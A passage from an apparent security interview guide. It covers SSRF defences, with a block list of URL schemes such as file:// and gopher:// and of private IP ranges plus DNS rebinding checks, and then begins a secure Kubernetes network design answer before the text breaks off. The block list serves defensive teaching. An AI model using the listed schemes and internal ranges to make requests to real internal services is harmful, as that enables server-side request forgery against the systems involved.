4. **Application-level:** Parse and validate URLs (block `file://`, `gopher://`, `dict://`, `localhost`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`). Use an HTTP client that doesn't follow redirects. Validate `Content-Type` of response.

5. **DNS rebinding protection:** After URL parsing, re-resolve the hostname immediately before the request; verify the resolved IP is in an allowed range. Prevents DNS rebinding attacks where the domain initially resolves to a public IP but rebinds to an internal IP.

---

### Q100. Design a production-grade secure Kubernetes cluster network architecture from scratch. What are the non-negotiables?

**Core design decisions:**

**1. CNI choice:** Cilium with eBPF datapath. Rationale: combined CNI + NetworkPolicy + service mesh (no-sidecar option), best performance at scale, L7 policy without full mesh overhead, Hubble for observability, WireGuard for node-to-node encryption.

**2. Node network:**
- Dedicated node CIDR per AZ (no overlap).
- Nodes in private subnets ONLY — no public IPs on nodes.
- SSH via SSM